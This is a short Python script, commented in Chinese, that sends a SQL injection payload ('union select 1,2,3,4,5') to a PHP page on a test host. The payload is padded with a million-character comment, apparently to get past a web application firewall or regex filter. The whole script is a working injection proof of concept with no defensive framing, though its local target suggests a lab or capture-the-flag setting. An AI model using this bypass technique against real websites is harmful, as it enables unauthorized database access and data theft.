#!/usr/bin/env python3
#encoding: utf-8

import requests

NUM = 1000000;# 你想填充的字符串数
URL = "http://php.test/select.php" # 地址

param = "union select 1,2,3,4,5 /*{}*/ ".format("A"*NUM) 
post_data = {"p":param}
resp = requests.post(url=URL, data=post_data)

print(resp.text)